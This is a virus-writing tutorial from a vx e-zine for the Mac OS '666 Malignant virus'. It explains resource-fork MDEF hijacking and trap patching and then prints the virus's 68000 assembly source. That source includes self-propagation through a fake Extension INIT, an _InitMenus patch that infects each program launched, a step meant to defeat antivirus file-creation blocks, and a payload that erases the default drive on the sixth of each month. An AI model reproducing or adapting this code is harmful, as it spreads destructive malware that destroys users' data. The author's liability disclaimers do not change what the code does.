*****************************************************
* The 666 Malignant virus, version 1.1, by J.S.Bach *
*****************************************************

(This file is specifically formatted for use with the DOS viewer. if you want
to acquire the correct file, download it from the XTAR section from the
corresponding project.)

*************************************************************************
WARNING!!!!! THIS IS A MALIGNANT VIRUS. ON EVERY SIXTH OF THE MONTH, IT WILL
ATTEMPT TO ERASE ALL DOCUMENTS ON THE DEFAULT DRIVE!!! BE VERY CAREFUL WITH
IT. IN PARTICULAR, THE AUTHOR IS NOT RESPONSIBLE IF YOU SCREW UP YOUR DRIVE
WHILE EXPERIMENTING WITH IT. IT MAY ALSO DAMAGE YOUR DRIVE, SINCE IT MAY
ERASE INVISIBLE FILES AS WELL. THE AUTHOR IS NOT RESPONSIBLE IF YOU RELEASE
THIS VIRUS. IN PARTICULAR, YOU CAN BE HELD LIABLE FOR DAMAGES AND/OR
CRIMINALLY CHARGED IF YOU CAUSE DAMAGE TO ANOTHER COMPUTER USING THIS VIRUS.
YOU HAVE BEEN WARNED! THE AUTHOR IS CLEAR OF ANY RESPONSIBILITY HAS NOT, NOR
DOES HE PLAN TO RELEASE THIS VIRUS!!!!!
*************************************************************************

To compile the projects on this article, you will need the MPW package from
Apple computer. The URL is:<http://developer.apple.com/dev/tools/tools.shtml>
you can download MacsBug from there as well if you don't have it. WARNING:
you will also need some form of AV to track the virus. If you try to run the
virus without an AV, you are in for surprises!


INTRODUCTION

The 666 virus is a meticulous study on the latest Operating System (8.x) and
constitutes adequate proof that a successful system 8.x virus can still be
written on the Macintosh. In view of one of my previous articles, re the type
of code that new viruses must be written on, i have chosen to write this one
in 68000 asm, to make it backward and forward compatible. Many of you that
have seen my project PROTOTYPE.sea, may wonder why i have written this one in
asm. Well, no matter how good the THINK Pascal compiler is, it still has its
limitations. Most of the limitations i encountered were the difficulty of
predicting at run time the size of the virus dynamically. Well, the time has
come for a "real" asm virus. So here you have it. This virus has not been
tested fully on the older systems, namely from 6.0.7 up to but not including
8.x. I created it in 8.0, but there is no reason why it should not run on
older systems down to 6.0.7 for sure-maybe older, or on newer 8.1 and 8.2
systems. With that out of the way, let me remind you something else VERY
crucial: DO NOT RELEASE THIS VIRUS INTO THE WILD! I will bare no
responsibility if you do! You will be liable to criminal penalties if you
release it. You have been warned! Ok, that having been said, now we are ready
to analyze this virus and its behaviour.

PRELIMINARIES

As you well know if you know anything about mac programming, resources and
resource files are a very crucial part of the macintosh system. I will try to
present the basic ideas behind their operation on this article, but please
don't expect to be spoon fed. If you don't have the book "Inside Macintosh",
you will be losing much needed info. So, let us start. Any macintosh file has
two "forks" or segments, called respectivelly the "data" fork, and the
"resource" fork. You can think of the two forks of a file as basically a
double file access buffer, with each buffer accessing a different part of the
file. The data fork is where random data can get stored, and you access it,
with usual file operations depending on what your offset into the data is.
The resource fork though, is much more complicated. The macintosh "Resource
Manager" (the part of the OS that manages resource forks) deals with the
resource fork of a file in very specific ways. In particular, direct access
to a resource fork is not generally allowed, except in very special
circumstances. The way the RM (Resource Manager) deals with that fork, is
through a predefined set of toolbox routines, which manipulate resource data
for you. You can think of the resource fork of a file as a specialized data
base, in which you can add, remove or change data through the RM routines. I
will refer you to the Inside Macintosh volumes "Macintosh Toolbox Essentials"
and "More Macintosh Toolbox", the Resource Manager. The RM, creates an
internal data storage format for every resource fork of every file you
access, that contains various elements such as a resource map (map to the
resource fork data) and offsets to your resource data. Usually, this data is
completely invisible to the user as he/she doesn't need to worry about it.
The user can manipulate the data in the resource fork through a set of
predefined routines, which fetch the data, ready for you. The data that go
into the resource fork, thus, are called "resources". With ResEdit or
Resourcerer, open a file and see internally what kind of resources it
contains, for example. Resources have "types" and "id"s. Types are the means
of identification between different resources, and ids are the means of
identification between same resources. For example a resource 'DRVR' with
id=2387 is different from a resource 'DRVR' with id=5341. The reason for the
existence of resources, is simple. Macintosh programs need to have data that
will be easily localizable in a special form accessible to non-programmers.
Thus, all menus, windows, controls, and text, can be stored in a proprietary
format that's easy to deal with when one localizes the application. Ideally,
a Localizer, should alter only the program's resources, and the program
should run fine after that. Well, even code in old 680x0 machines was stored
in 'CODE' resources, but now things have changed.

NOTES ON THE PROPRIETARY CODE FORMATS ON THE OLD MACS AND NEW POWERMACS

The old Macs had a 600x0 Motorola processor and the code of the programs was
itself a resource (of type 'CODE') and was stored in the resource fork of the
program file. Many viruses were written till 1992-94 approximatelly when the
new PowerPC RISC chip was introduced with the new PowerMacs. The old 'CODE'
resource format was easy to manipulate (see my examples on Codebreakers #2
e-zine, or the project with the four viruses T4, CODE 32767, and the old MDEF
and WDEF viruses). The virus grabbed the CODE resource it wanted and altered
some entry and exit points, and appended itself either to the end of an
existing 'CODE' resource, or forced the entry point code ('CODE'=0) to call
the virus first. The new PowerPC chip has to deal with existing applications
though, so some way to execute 680x0 code had to be provided free of charge.
The people at Apple provided an emulation mechanism, built in the chip
itself. The emulator of the PowerPC chips is equivallen to a LC68020
processor with no floating point capabilities, since the PowerPC chip has
internal floating point itself natively. Thus, any PowerPC chip, can execute
up to 68020 code, successfully. A new question now arrises, that of the
format of the new application code. Unfortunatelly, Apple puts the code for
the PowerPC chip on the data fork, in a "container" called "fragment". The
processor reads some vital information from some resources, (namely 'cfrg')
and then jumps into the data fork. If an application has no 'CODE' resources,
it is called "native" to the PowerPC chip, and can only be run off the newer
chips. But an application can contain BOTH 'CODE' resources AND fragments in
the data fork. Then, the application will execute either code, depending on
which platform it is run. If it tries to run on a 680x0 machine, the
fragments are ignored and the 680x0 chip loads the 'CODE' resources and
executes them. If the application is run on a PowerMac, the loader looks for
'cfrg' resources, and if it finds one, it loads the fragments in the data
fork, ignoring the 'CODE' resources. Such an application is called "fat". To
summarize: we can have 1) a 680x0 'CODE' resource only application, 2) a code
fragment only application (called native to the PowerPC) and 3) a fat
application containing both. The rest of the resources in the application are
treated in exactly the same way. For example, the trap GetMenu(32) will fetch
a handle to a 'MENU' resource, regardless of where it comes from, whether
from code fragment code, or from a 680x0 'CODE' resource. (More on Handles
later). The problem that virus writters now face is obvious. While most of
the older viruses were successful in infecting 'CODE' resources, the newer
applications, (either the fat ones or the native ones) are going to be immune
to the virus. Well, the virus may still modify 'CODE' resources on a fat
application, but what's the point? Those resources will never get executed,
since if they run on a PowerPC machine, the loader ignores them. If they get
execyted on a 680x0, we are fine though. But what's the use? We are losing a
great percentage of the population this way. In actual estimates, 45% of the
macs are PowerMacs, and the percentage is growing fast, as Apple will
eventually dump the 680x0 scheme altogether. Support for them has already
gone off the deep end anyway. What can we do then? We can write our code in
PowerPC code! Yeah, and miss the already existing 55% of the older macs. No
way out? Well, the solution is definatelly 680x0 code, but executed in such a
way as to not interfere with the applications' code, whether it is a native
or a fat or a 680x0 application. We could in principle create a "fat" virus,
which would contain dual code and execute either one upon command. But why do
that since we have a wonderful emulator-the built in emulator of the PowerPC
chip in our hands? So the only viable solution to our dire need seems
resources of bypassable code, such as MDEFs, WDEFs and CDEFs. Thus, we can
hope to infect ANY kind of application, on ANY kind of mac, by carefully
utilizing those bypass resources. We then have the best of both worlds! Let's
see why:

THE MDEF RESOURCE

The resource that interest us in this case is the 'MDEF' resource, as it is
vital for the virus' survival. The reason why this is the case, is because
the RM has a very nice characteristic, which any carefully designed virus can
utilize to cause its own spreading. This characteristic is: Suppose you have
a file that contains the resource 'abcd' of id=x. When you open this file
internally, the RM loads that resource in memory. But suppose you have a
second file that also contains a resource 'abcd' of id=x. The RM loads the
second resource into memory and BYPASSES the old one!. That is, the second
instance of that same resource becomes active. This means that if i request
'what is a resource abcd=x' the RM will fetch the second instance. This is
trully wonderful!. Why? Because if a virus IS a (different in content) MDEF
resource than one that already exists with the same type and id, it will
bypass the old one and activate! Programs use this characteristic to draw
specialized menus, windows and controls. For example: The System file
contains a 'MDEF' resource of id=0 which is a Menu DEFinition function,
responsible for drawing any menu by default. So any program doesn't have to
worry about drawing its menus explicitly. BUT! if a program wants to draw a
special menu, say one with lots of pictures in it, or characteristics that
the regular MDEF does not provide (actually the system MDEF can draw pictures
inside menus but let's leave that alone) then all it has to do is include in
its resource fork a 'MDEF' resource. This MDEF will be just the compiled code
for the definition function that draws that specialized menu. The program
also needs to specify that this MDEF, say of id=78, is used when the Menu
manager draws the program menus. The way to do that, is to specify somewhere
in a 'MENU' resource the id of that included 'MDEF' (I will be using MENU
instead of 'MENU' from now on). To see that, open any application and edit it
with ResEdit. Open one of its MENU resources, and select from the 'MENU'
Menu, 'Edit MENU & Menu ID...'. You will see the id of the MDEF that's used
for that menu when the program executes. If you see 0, the menu manager uses
MDEF=0 to draw that menu. If you see any other id, the menu manager uses a
MDEF=that id to draw the menu. Wonderful. So why so much attention paid to
MDEFs? Well, you have guessed already that the virus will BE a MDEF. But, you
will ask, "isn't a MDEF just code for drawing a menu"? Well, the answer to
that is, "it MIGHT be..." Or better yet, "it should EVENTUALLY draw a menu".
That "eventually" is the key to the virus. We can write a MDEF that is NOT
code for drawing a menu, rather it is a virus, and when it finishes
executing, it can call indirectly the good old MDEF=0, i.e. the one that's
responsible for drawing anyway. In order for the Menu manager to call then
our virus, all we have to do is place it inside any file and change the MDEF
id of some MENU resource in that file to OUR id, so that the menu manager
uses the virus to "draw" the menu. Good. Now let's look at another basic
principle of the Mac OS, handles.

POINTERS AND HANDLES

On most machines out there, you are familiar with the notion of a 'pointer'
which is nothing more than a variable that holds the address of some data.
Pointers on the macintosh are implemented using pretty much the same
principle, except that the block that holds the data the pointer points to,
CAN NEVER MOVE in memory. The net result of this, is that if one allocates
many pointers (and the blocks that they point to), memory becomes fragmented.
That is, you may have large blocks of data scattered throughout the heap,
which have empty space between them, and in fact that space may be large, but
if you try to allocate another block, you may be unable to, because the empty
space is fragmented. It is very possible to have 10 megs of free space
between the blocks you have allocated, but you may be unable to allocate even
2megs, because the largest 'gap' between already allocated blocks may be less
than 2 megs. For example, suppose the gaps are 1, 1.3, 0.5, 0.7, etc. You get
a sum of 3.5 megs total empty space, but you are unable to allocate anything
more than 1.3megs. You get the idea. The way this problem is solved, is
through 'handles'. Handles are pointers to pointers. When a user requests a
block of memory, the Macintosh OS allocates (IF the user wants a handle) a
RELOCATABLE block of memory. How can a block be relocatable? Easy. The system
assigns a MASTER POINTER to the block in low heap. This block NEVER moves,
and holds always the address of the relocatable block. The system then
returns a Pointer to the Master pointer to the user. That is, the user gets a
pointer to the master pointer, called a handle. This handle simply holds the
address of the Master pointer. IF and WHEN the OS needs to move the block of
memory because of possible fragmentation-i.e. when the system COMPACTS the
heap, the OS updates the Master Pointer regarding the new address of the
block, but the user is free of the hassle, because he has a handle, which
ALWAYS points to the Master Pointer! Smart! Contrary to blocks that are
referred to through handles which are relocatable, blocks that are refered to
though regular pointers are IMMOVABLE. They can never move. That's why, most
Macintosh development takes place using LOTS of handles. Why the fuss with
handles? Because when you request a resource from a file, the resource
manager returns to you a resource Handle. Suppose you have the following
resource 'INTS' in one resource file: resource 'INTS', id=666 1 2 3 4 5 6

which has been declared in Pascal as: INTS=array[1..6] of integer;
INTSPtr=^INTS; INTSHandle=^INTSPtr;

var myINTSHandle:Handle; {generic handle}

You can add now this resource provided you have a valid memory handle on the
data. So essentially you would proceed as follows:

myINTSHandle:=NewHandle(SizeOf(INTS)); {allocate handle to block of 12 bytes}
HLock(myINTSHandle); {lock block so it doesn't move while we access}
INTSHandle(myINTSHandle)^^[1]:=1; INTSHandle(myINTSHandle)^^[2]:=2;
INTSHandle(myINTSHandle)^^[3]:=3; INTSHandle(myINTSHandle)^^[4]:=4;
INTSHandle(myINTSHandle)^^[5]:=5; INTSHandle(myINTSHandle)^^[6]:=6;
HUnLock(myINTSHandle); {unlock the memory so it is free to move again}
AddResource(myINTSHandle,'INTS',666,'my Integers');
if ResError<>noErr then DoError;

When you later request now this resource through the resource manager, you
call: myINTSHandle:=GetResource('INTS',666); In turn what this call does is
return to you a handle which can be pictured as follows:

         <-------$AAB8:|$3450|<------
$3450:|1|                |          |
$3452:|2|   (Master Pointer@$AAB8)  |
$3454:|3|                           |
$3456:|4|                           |
$3458:|5|                           |
$345A:|6|     myINTSHandle@$8762:|$AAB8|

Thus, in Pascal, you could get to the data in this case for example, by using
a dereference twice. So INTSHandle(myINTSHandle)^^[1]=1,
INTSHandle(myINTSHandle)^^[2]=2, etc. So now, all resource manager calls like
GetResource, Get1Resource, AddResource, etc, operate on handles. When a file
is opened, the resource manager allocates handles for all the resources that
are contained in the file. Thus the only thing we have to do is request one
to get access to the data. You have gotten the basic idea. With this out of
the way, we can proceed to analyze the general operating principles behind
the virus.

OPERATIONAL VIRUS PRINCIPLES-THE DOUBLE ACTION PRINCIPLE

Ok, suppose our infected file contains a viral MDEF=666, and one of the
file's MENU 'MDEF' id' has been changed to 666. This means that as soon as
the program starts executing, the Menu manager will try to draw the program's
menus, and in the process it will invoke our MDEF=666. Wonderful. Our virus
executes. What next? Well it should infect the System of course first! How
can this be done? One option would be to copy ourselves (as a MDEF=666 which
is running now) to the System file. Well, this is not such a good idea for
many reasons. The System file for one, is over 6megs in size and screwing
around with it while operating, is quite dangerous. In the best case, there
would be a tremendous delay re-writting the whole 6meg file when an infected
application executes. We don't want that. What else? We need to find a way to
activate the virus as long as the machine is operating. What if we write an
extension? Good idea. But what should this extension do? It should be able to
"install" a memory version of our virus, which will be kept alive until we
restart. How do we do that? With "trap patching" of course! If we patch a
suitable trap, then when ANY program calls this trap, the code in the trap
will force the program to be infected. For those of you who did not download
e-zine #2 from the codebreakers site, i will include the segment on trap
patching here, so you can have a complete understanding on the subject. Here
we go:

SYSTEM TRAPS AND TRAP PATCHING

As you know, the characteristsic look and feel of any Mac program is due
mainly to the extensive use of many System Traps that correspond to specific
routines in Inside Macintosh. For example, most of the procedures in IM
(Inside Macintosh) are actually routines that get executed when the processor
tries to execute an instruction of the form $Axxx. The 680x0 processor does
not recognize such instructions (as well as $Fxxx) and when it encounters
one, it generates an exception. An exception vector takes control and the
system calculates an address based on the number that follows the A digit.
The details are in IM. For example, the procedure call
"AddResource(theHandle,'CDEF',32,"myCDEF");" generates the following assembly
code:

00000008: 2F2E FFFC          MOVE.L    theHandle(A6),-(A7)
0000000C: 2F3C 4D44 4546     MOVE.L    #$4D444546,-(A7); 'MDEF'
00000012: 3F3C 0020          MOVE.W    #$0020,-(A7)
00000016: 486E FEFC          PEA       Name
0000001A: A9AB               _AddResource

As you can see, the parameters are first pushed onto the stack
and then the trap $A9AB is executed. In reality, the trap is never executed.
It generates an exception that dispatches the PC onto some table
that contains the addresses of all the system routines.
The table looks something like this:

Trap #    Routine Address
...    ...
$A9AB    $3501980 (routine address with index 171 of table)
$A9AC    $9ACD0F0 (routine address with index 172 of table)
$A9AD    $8709FFA (routine address with index 173 of table)
...    ...

The System calculates the specifics of the dispatch based on
the binary representation of the trap: 
$A9AB=1010100110101011

Bit 8 for example is the bit that charachterizes toolbox traps. The first 7
bits (from right) provide the index into the trap dispatch table. (Here
$AB=171). More details in Inside Macintosh. Now as you may have suspected, it
is obvious that ANY address can be installed in a specific trap dispach table
entry. For example, we don't have to have address $3501980 in entry 171. We
can install a different address, that corresponds to a different routine. But
because usually the functionality of the original needs to be preserved, we
need to be able to call the original routine as well. The way to do that is
called "Trap Patching". It is the process of installing a "patch" (head or
tail) to the actual routine's address. We can install something prior to
calling the original (called head patch) or something that post-processes the
original (tail patch). What follows is an example of how to write a routine
patch. For simplicity, I will use here the routine for
"DrawString(theStr:Str255)". The  patch consists of two separate projects.
The actual patch code (an MPW asm file) and a THINK Pascal project that
creates an INIT that installs the new routine at startup.

File DrawStringPatch.a
    STRING  ASIS

    INCLUDE  'SysEqu.a'
    INCLUDE 'SysErr.a'
    INCLUDE  'ToolEqu.a'
    INCLUDE  'Traps.a'

    SEG  'DrawStringPatch'
DrawStringPatch  MAIN
Entry
  BRA.S  MyDrawString    ;branch around next 4 bytes
OldDrawString
  DC.L  0      ;original address is stored here!!
;what follows from here is the actual pre-processing code
MyDrawString
  MOVEM.L  A0-A4/D0-D7,-(SP)  ;save registers
  MOVE.W  #4,-(SP)      ;push integer 4 onto stack
  _SysBeep          ;sound the beeper
;end of pre-processing code
ExitPatch
  MOVEM.L  (SP)+,A0-A4/D0-D7  ;restore registers
  MOVE.L  OldDrawString,A0  ;get address of old DrawString
  JMP  (A0)          ;jump to original DrawString Code
  END

The build MPW commands to create the patch code segment:

asm -o DrawStringPatch.a.o DrawStringPatch.a
link DrawStringPatch.a.o -o PTCH.rsrc -t RSRC -c RSED -rt
'PTCH'=35 -ra DrawStringPatch=resSysHeap,resPreload,resLocked

File InstallDrawStringPatch.p

unit InstallAPatch;
interface
 procedure Main;
implementation
 const
  _DrawString = $A884;  {Trap number for DrawString routine}
 type
  PTCHHeader = record  {look at the asm file}
    BRAS: integer;  {the first instruction is a BRA.S}
    OriginalAddress: longint;  {the place we store original address}
   end;
  PTCHHeaderPtr = ^PTCHHeader;  {Master pointer}
  PTCHHeaderHandle = ^PTCHHeaderPtr;  {Handle}
 procedure Main;
  var
   thePTCH: Handle;
 begin
  thePTCH := GetResource('PTCH', 35);{load the resource into mem}
  if thePTCH <> nil then    {if good handle}
   begin
{Store OriginalAddress at header of resource. Look at asm file}
    PTCHHeaderHandle(thePTCH)^^.OriginalAddress :=
    NGetTrapAddress(_DrawString, ToolTrap);
{now set trap dispatch table address}
{to Entry Point of Patch (Entry))
    NSetTrapAddress(Ord(thePTCH^), _DrawString, ToolTrap);
    DetachResource(thePTCH);  {detach from memory}
   end;
end;
end.

Create the INIT with id=35 with the THINk Pascal project. After you assemble
the MPW asm file, open the code segment patch file with ResEdit and copy the
'PTCH' resource into the INIT which you created with the THINK Pascal
project. Then, put the INIT into your System folder. Be prepared for
thousands of beeps. OK, now for the analysis of what we have done: First the
MPW file. As you can see there are certain params for the assembler which you
should take for granted for now. The first instruction is a BRA.S
MyDrawString. This forces the PC to immediatelly go to label "MyDrawString".
Just to avoid hitting the actual address which is at "OldDrawString". So now,
we are in our space. We can do whatever we want. The original has not been
called yet and we have all the tools at our disposal. Here, we do something
simple, like sound the beeper. Next, after we are done with whatever we want
to do, we restore the regs, and load the original address from the place
where the Pascal INIT has put it at run time: At "OldDrawString". And finally
JMP to that location, which forces the original to be called. That's it. A
couple of things to note: We use a JMP and not a JSR. Can you tell why?
Because the original routine is responsible for returning to the caller of
the _DrawString trap. IF we wanted to do a tail-patch-i.e. if we wanted to
post-process the trap code, we would call JSR (A0) and the original routine
would return to us, first, we could then do post-processing and then return
to the caller! This is left as an exercise to the reader.

Continuing now our discussion on the 666 virus, we can create an Extension
file that will patch some trap and install our viral code into the system.
Which trap shall we patch? Well it depends on how many times we want our
virus to activate. I like simplicity, so i wanted the virus to activate ONE
time for every program run. Which trap gets used then only ONCE in any
macintosh application? Well, take a pick: Any mac program starts with the
following traps:

InitGraf(@thePort);
InitWindows;
InitMenus;
TEInit;
InitDialogs(nil);

So, the natural choice to pick would be some trap that has something to do
with menus. _InitMenus of course then is the likely candidate. We will patch
_InitMenus. By doing so, when any program starts, the moment it invokes this
trap, it will become infected, by virtue of our patched code that lies INSIDE
the trap itself which infects the file that has been run. Now you understand
the DOUBLE ACTION PRINCIPLE. It is the interplay between infected program and
the System. An infected program infects the system and an infected system
infects a running program. Without this principle, any virus is useless. Our
virus thus, will exhibit a dual behaviour, depending on whether it is running
from a program, or from the system. If it is running from a program, it just
needs to check the system and infect it if it is not infected. If it is
running from the system, it must become memory resident and infect any
running application. Ok, now that you have seen the general double principle
scheme, you will immediatelly recognize the two parts of the virus. Lets see
then the virus in its totality and start our analysis. You may want to print
out this manual so you can reference its various parts when you read the
analysis.

;***************************************************************
;WARNING!! THE AUTHOR IS NOT RESPONSIBLE FOR UNAUTHORIZED USE OF
;THIS PROGRAM. IN PARTICULAR, THE AUTHOR IS NOT RESPONSIBLE IF
;YOU TRY TO, OR RELEASE THE VIRUS. THE AUTHOR IS NOT RESPONSIBLE FROM
;CRASHES OR MISBEHAVIOUR CAUSED BY THIS PROGRAM IN ANY OPERATING
;SYSTEM. THIS PROGRAM IS PROVIDED AS A DEMONSTRATION VIRUS AND IS
;NOT INTENDED TO BE INSTALLED ON MACHINES THAT YOU HAVE NO CONTROL
;OVER. YOU HAVE BEEN WARNED: YOU ARE LIABLE TO CRIMINAL PENALTIES
;IF YOU RELEASE THIS VIRUS AND SPREAD IT IN EXECUTABLE FORM.
;WARNING!! THIS VIRUS WILL INFECT ANY OS FROM 6.0.7 UP TO 8.0,
;POSSIBLY 8.1 AS WELL. BE VERY CAREFULL WHEN YOU EXECUTE IT. IT
;WILL GRADUALLY INFECT ANY APPLICATION YOU RUN, AND MAY CAUSE
;CRASHES AND OTHER ILL BEHAVIOUR. IT WILL ALSO ERASE YOUR HARD DRIVE
;WHEN ITS TRIGGER DATE IS MET. YOU HAVE BEEN WARNED.
;***************************************************************
;666 VIRUS, VERSION 1.0, WRITTEN IN 68000 ASM USING MPW 3.3.1. IN
;PARTICULAR, YOU NEED MPW 3.3.1 OR HIGHER TO COMPILE THIS SOURCE.
;WRITTEN AND COMPLETED ON 13/5/98  BY J.S.BACH.
;***************************************************************
        BLANKS  ON
        STRING  ASIS
;include files for asm
        INCLUDE  'SysEqu.a'
        INCLUDE 'SysErr.a'
        INCLUDE  'ToolEqu.a'
        INCLUDE  'Traps.a'
        INCLUDE 'Folders.a'

        SEG  '666'  ;segment name
;***************************************************************
;System Variables
;***************************************************************
SystemMDEF  EQU    0    ;offset of SystemMDEF var from Vars
Handle2Us  EQU    4    ;offset of Handle2Us var from Vars
CurResFile  EQU    8    ;offset of CurResFile var from Vars
ExtRefNum   EQU    10    ;offset of ExtRefNum var from Vars
foundVRefNum  EQU  12    ;offset of foundVRefNum from Vars
foundDirId  EQU    14    ;offset of foundDirId var from Vars
INITRes    EQU    18    ;offset of INITRes var from Vars
NewHandle  EQU    22    ;offset of NewHandle var from Vars
bytes2copy  EQU    26    ;offset of Bytes2Copy var from Vars
MENURes    EQU    30    ;offset of MENURes var from Vars
ProcID    EQU    6    ;offset into the 'MENU' resource handle
day      EQU    4    ;offset into datetimerec
InitMenus  EQU    $A930  ;trap to patch
FileType  EQU    32    ;offset to filetype into CInfoRec

;***************************************************************
;A4 always holds the address of our first var
;***************************************************************
  MAIN
Entry
  MOVEM.L  A0-A4/D0-D7,-(SP)    ;save registers
  LEA    Vars,A4          ;get globals address
  CLR.W  -(SP)          ;room for refnum returned
  _CurResFile            ;return current resource file refnum
  MOVE.W  (SP)+,CurResFile(A4)  ;put in storage
;***************************************************************
;first see if there is a 666 'INIT' resource in our file
;if there is, we are an INIT. If not, we are a MDEF
;***************************************************************
  CLR.L  -(SP)          ;room for 'INIT' handle
  MOVE.L  #'INIT',-(SP)      ;push resource type
  MOVE.W  #666,-(SP)        ;push id=666
  _Get1Resource          ;load resource in mem
  MOVE.L  (SP)+,INITRes(A4)    ;put handle in storage
  BEQ.S  MDEF          ;if nil, run MDEF
;***************************************************************
;if we fall through, we are an INIT. So patch the _InitMenus trap
;***************************************************************
PatchInitMenus
  MOVE.W  #InitMenus,D0      ;trap number of _InitMenus in D0
  _GetToolboxTrapAddress      ;get its old trap number
  LEA    MyInitMenus,A1      ;address of patch in A1
  MOVE.L  A0,2(A1)        ;stuff old address in patch header
  MOVE.W  #InitMenus,D0      ;trap number of _InitMenus in D0
  LEA    MyInitMenus,A0      ;load our address
  _SetToolboxTrapAddress      ;set to new address
  MOVE.L  INITRes(A4),-(SP)    ;push handle to us
  _DetachResource          ;cause it to float and detach from file
ExitInit
  MOVEM.L  (SP)+,A0-A4/D0-D7    ;restore registers
  RTS                ;return to whoever called the INIT.
;***************************************************************
;The next code will be run if the virus gets executed from within
;an infected application.
;***************************************************************
;***************************************************************
;first get and store the address of our MDEF, i.e. ourselves
;and store it so we have a reference to ourselves.
;***************************************************************
MDEF
  CLR.L  -(SP)          ;room for handle to MDEF resource
  MOVE.L  #'MDEF',-(SP)      ;push MDEF type
  MOVE.W  #666,-(SP)        ;push id=666
  _GetResource          ;get hold of our MDEF
  MOVE.L  (SP)+,Handle2Us(A4)    ;put in Storage
;***************************************************************
;then get and store the address of the system MDEF=0
;if we don't have it already
;***************************************************************
  CLR.W  -(SP)          ;refnum of system file (0)
  _UseResFile            ;use system res file
  CLR.L  -(SP)          ;room for handle to MDEF=0 resource
  MOVE.L  #'MDEF',-(SP)      ;push MDEF restype
  CLR.W  -(SP)          ;push id=0
  _Get1Resource          ;get hold of it
  MOVE.L  (SP)+,SystemMDEF(A4)  ;put in Storage
  BNE.S  CheckDate        ;if non-nil, check date
  _Debugger            ;crash if we can't get a system MDEF!!!
;***************************************************************
;the following code will check if it is the virus's trigger date
;if it is, all hell breaks loose, and the virus starts deleting
;files. Be VERY careful with this virus.
;***************************************************************
CheckDate
  MOVE.L  Time,D0          ;get seconds since 1904
  LEA    DatTimeRec,A0      ;load address of DateTime record
  _Secs2Date            ;convert
  CMP.W  #6,day(A0)        ;check day!
  BNE.S  InfectSys        ;no trigger date, go to infect system
  LEA    HParamBlock,A0      ;parameter block
  CLR.L  ioNamePtr(A0)      ;nil ionameptr
  _GetVol              ;get default volume
  BNE    ExitInfection      ;exit on error
  MOVE.W  ioVRefNum(A0),-(SP)    ;push vrefnum
  MOVE.L  #fsRtDirID,-(SP)    ;push start directory
  BSR    EraseDrive        ;hallelujah, brothers!!!!!
  BRA    ExitInfection      ;job done, exit
;***************************************************************
;the following code infects the system. We create a "special"
;Extension that is put in the Extensions folder. When the computer
;restarts, this extension will infect the computer's memory
;***************************************************************
InfectSys
  CLR.W  ExtRefNum(A4)      ;clear reference number of extension
;***************************************************************
;call FindFolder to get the vRefNum and DirId of the Extensions folder
;***************************************************************
  CLR.W  -(SP)          ;room for error from FindFolder
  MOVE.W  #kOnSystemDisk,-(SP)  ;on system disk
  MOVE.L  #kExtensionFolderType,-(SP)  ;ExtensionsFolder
  MOVE.B  #kDontCreateFolder,-(SP)  ;no new folder
  PEA    foundVRefNum(A4)    ;address of returned vrefnum
  PEA    foundDirID(A4)      ;address of returned dirid
  _FindFolder            ;get extensions folder
  MOVE.W  (SP)+,D0        ;copy error in D0
  BNE    CallOldMDEF        ;exit on non-zero error code
;***************************************************************
;call MakeFSSpec to get a file specification to use for our new
;Extension file inside the EXtensions folder.
;***************************************************************
  CLR.W  -(SP)          ;room for error from FSMakeFSSpec
  MOVE.W  foundVRefNum(A4),-(SP)  ;push foundVRefNum
  MOVE.L  foundDirId(A4),-(SP)  ;push foundDirId
  PEA    ExtensionName      ;push name
  PEA    theSpec          ;push address of theSpec
  _FSMakeFSSpec          ;make file Spec
  MOVE.W  (SP)+,D0        ;copy error but ignore
;***************************************************************
;call FSpCreateResFile to create a resource file (our Extension)
;so we can put our virus in it.
;***************************************************************
  PEA    theSpec          ;push theSpec
  MOVE.L  #'666 ',-(SP)      ;push creator of file
  MOVE.L  #'INIT',-(SP)      ;push filetype of file
  MOVE.W  #0,-(SP)        ;push Roman script code
  _FSpCreateResFile        ;try to create it
;***************************************************************
;now get FInfo information about this file we have just created.
;***************************************************************
  CLR.W  -(SP)          ;room for error
  PEA    theSpec          ;filespec
  PEA    Finfo          ;push address for File info
  _FSpGetFInfo          ;get file info
  MOVE.W  (SP)+,D0        ;get error
  BNE    ExitInfection      ;exit on error
;***************************************************************
;now we have the file info on record. The reason we need it, is
;if there is an antivirus running, it won't let us create such a file
;so we reset the file attributes if our call is successful this time
;***************************************************************
  LEA    FInfo,A0        ;load address of Finfo
  MOVE.L  #'INIT',fdType(A0)    ;reset file type
  MOVE.L  #'666 ',fdCreator(A0)  ;reset file creator
;***************************************************************
;now set back the info for the file.
;***************************************************************
  CLR.W  -(SP)          ;room for error
  PEA    theSpec          ;filespec
  PEA    Finfo          ;push address for File info
  _FSpSetFInfo          ;get file info
  MOVE.W  (SP)+,D0        ;get error
  BNE.S  ExitInfection      ;exit on error
;***************************************************************
;now we try to open the new file with a call to _FSpOpenResFile
;***************************************************************
  CLR.W  -(SP)          ;clear stack for file refnum
  PEA    theSpec          ;push theSpec
  MOVE.B  #fsWrPerm,-(SP)      ;push write permission
  _FSpOpenResFile          ;open it
  MOVE.W  (SP)+,ExtRefNum(A4)    ;pop and store refnum
  MOVE.W  ResErr,D0        ;check for error
  BNE.S  ExitInfection      ;error, exit
;***************************************************************
;check if the new file contains our virus.
;***************************************************************
  CLR.L  -(SP)          ;room for INIT handle
  MOVE.L  #'INIT',-(SP)      ;push res type
  MOVE.W  #666,-(SP)        ;push res id
  _Get1Resource          ;try to get resource
  MOVE.L  (SP)+,A0        ;put in A0
  MOVE.L  A0,D0          ;copy in D0
  BNE.S  ExitInfection      ;if <>0 it exists, system is infected, exit
;***************************************************************
;add viral resourse to Extension if empty
;***************************************************************
  MOVE.L  Handle2Us(A4),-(SP)    ;push ourselves
  _DetachResource          ;detach from resource file
  MOVE.L  Handle2Us(A4),-(SP)    ;push handle
  MOVE.L  #'INIT',-(SP)      ;push type
  MOVE.W  #666,-(SP)        ;push id
  PEA    ExtensionName      ;push name
  _AddResource          ;add resource into file
  MOVE.W  ResErr,D0        ;get error
  BNE.S  ExitInfection      ;exit on error
;***************************************************************
;now set the attributes of the '666 ' resource
;***************************************************************
  CLR.W  -(SP)          ;room for attrs
  MOVE.L  Handle2Us(A4),-(SP)    ;push handle
  _GetResAttrs          ;get the attrs
  MOVE.W  (SP)+,D0        ;copy attrs in D0
  BSET  #ResSysHeap,D0      ;we want SysHeap
  BSET  #ResPreload,D0      ;we want ResPreload
  BSET  #ResLocked,D0      ;we want ResLocked
  MOVE.L  Handle2Us(A4),-(SP)    ;push handle to resource
  MOVE.W  D0,-(SP)        ;push new attributes
  _SetResAttrs          ;set new attributes
  MOVE.W  ResErr,D0        ;get error code
